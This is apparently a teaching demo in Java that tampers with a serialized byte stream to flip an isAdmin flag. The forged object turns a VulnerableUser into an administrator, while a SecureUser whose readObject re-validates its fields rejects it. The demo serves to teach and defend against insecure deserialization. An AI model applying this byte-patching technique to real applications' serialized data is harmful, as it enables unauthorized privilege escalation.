import java.io.*;

public class ByteStreamExploit {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 1. Demonstrate legitimate user creation (non-admin)
        VulnerableUser regularUser = new VulnerableUser("regular", false);
        System.out.println("Legitimate user created via constructor: " + regularUser);

        // --- EXPLOIT FOR VULNERABLEUSER (BYTE STREAM MANIPULATION) ---
        System.out.println("\n--- Exploiting VulnerableUser via Byte Stream Manipulation ---");

        // Step 1: Create a VulnerableUser object that passes constructor validation
        // (isAdmin=false)
        VulnerableUser userToExploit = new VulnerableUser("attacker", false);

        // Step 2: Serialize this legitimate object to get its byte stream
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(userToExploit);
        oos.close();
        byte[] serializedData = baos.toByteArray();

        // Step 3: Manually modify the serialized byte array to change 'isAdmin' from
        // false to true.
        // We find the offset by looking for the end of the class description marker (78
        // 70).
        // The first field (isAdmin) follows immediately.
        int booleanByteIndex = -1;
        for (int i = 0; i < serializedData.length - 1; i++) {
            if (serializedData[i] == (byte) 0x78 && serializedData[i + 1] == (byte) 0x70) {
                booleanByteIndex = i + 2;
                break;
            }
        }

        if (booleanByteIndex != -1 && booleanByteIndex < serializedData.length) {
            serializedData[booleanByteIndex] = 0x01; // Change false (0x00) to true (0x01)
            System.out.println("Modified serialized byte at index " + booleanByteIndex + " to set isAdmin=true.");
        } else {
            System.out.println("Could not find a suitable byte to modify for VulnerableUser. Exploit might fail.");
        }

        System.out.println("\nAttempting to deserialize malicious object...");

        // Step 4: Deserialize the modified byte stream as VulnerableUser.
        // The VulnerableUser's readObject() method does not re-validate, so it will
        // accept
        // the manipulated 'isAdmin' flag, creating an unauthorized admin.
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);

        VulnerableUser deserializedMaliciousUser = (VulnerableUser) ois.readObject();
        ois.close();

        System.out.println("Deserialized malicious user: " + deserializedMaliciousUser);

        if (deserializedMaliciousUser.isAdmin()) {
            System.out.println(
                    "\n!!! EXPLOIT SUCCESSFUL: 'attacker' user is now an administrator due to deserialization vulnerability !!!");
        } else {
            System.out.println("Exploit failed: isAdmin is still false or username corrupted.");
        }

        // --- TESTING SECUREUSER (BYTE STREAM MANIPULATION) ---
        System.out.println("\n--- Testing SecureUser via Byte Stream Manipulation ---");
        SecureUser secureRegularUser = new SecureUser("regular", false);
        System.out.println("Legitimate secure user created via constructor: " + secureRegularUser);

        // Step 1: Create a SecureUser object that passes constructor validation
        // (isAdmin=false)
        SecureUser secureUserToExploit = new SecureUser("attacker", false);

        // Step 2: Serialize this legitimate SecureUser object
        ByteArrayOutputStream baosSecure = new ByteArrayOutputStream();
        ObjectOutputStream oosSecure = new ObjectOutputStream(baosSecure);
        oosSecure.writeObject(secureUserToExploit);
        oosSecure.close();
        byte[] serializedSecureData = baosSecure.toByteArray();

        // Step 3: Manually modify the serialized byte array to change 'isAdmin' from
        // false to true.
        int booleanSecureByteIndex = -1;
        for (int i = 0; i < serializedSecureData.length - 1; i++) {
            if (serializedSecureData[i] == (byte) 0x78 && serializedSecureData[i + 1] == (byte) 0x70) {
                booleanSecureByteIndex = i + 2;
                break;
            }
        }

        if (booleanSecureByteIndex != -1 && booleanSecureByteIndex < serializedSecureData.length) {
            serializedSecureData[booleanSecureByteIndex] = 0x01; // Change false (0x00) to true (0x01)
            System.out.println("Modified serialized byte for SecureUser at index " + booleanSecureByteIndex
                    + " to set isAdmin=true.");
        } else {
            System.out.println("Could not find a suitable byte to modify for SecureUser.");
        }

        System.out.println("\nAttempting to deserialize malicious SecureUser object...");

        // Step 4: Deserialize the modified byte stream as SecureUser.
        // This should trigger the validation in SecureUser's readObject method and
        // throw an IllegalArgumentException.
        ByteArrayInputStream baisSecure = new ByteArrayInputStream(serializedSecureData);
        ObjectInputStream oisSecure = new ObjectInputStream(baisSecure);

        try {
            SecureUser deserializedSecureMaliciousUser = (SecureUser) oisSecure.readObject();
            System.out.println("Deserialized malicious secure user: " + deserializedSecureMaliciousUser);
            if (deserializedSecureMaliciousUser.isAdmin()) {
                System.out.println("SecureUser exploit FAILED: 'attacker' user is an administrator.");
            } else {
                System.out.println("SecureUser successfully prevented privilege escalation.");
            }
        } catch (IllegalArgumentException e) {
            System.out.println("SecureUser successfully prevented exploit during deserialization: " + e.getMessage());
        } catch (Exception e) {
            System.out.println("An unexpected error occurred during SecureUser deserialization: " + e.getMessage());
            e.printStackTrace();
        }
        oisSecure.close();
    }
}
